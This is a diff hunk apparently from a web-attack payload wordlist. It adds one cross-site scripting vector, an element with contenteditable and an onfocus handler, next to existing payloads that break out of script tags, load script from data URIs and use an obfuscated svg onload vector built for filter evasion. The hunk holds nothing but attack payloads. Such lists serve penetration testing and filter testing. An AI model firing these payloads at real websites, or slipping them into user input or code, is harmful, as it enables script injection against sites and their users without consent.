@@ -986,4 +986,5 @@ data:text/html<svg/onload=parentNode.parentNode.parentNode[/locatio/.source+/n/.
 "><script/src=data:,alert(1)%26sol;%26sol;
 </script><script>alert(1)+"
 "</script><svg><script>alert(1)+&quot;";
+<w contenteditable id=x onfocus=alert()>
 /* RFI STOP */
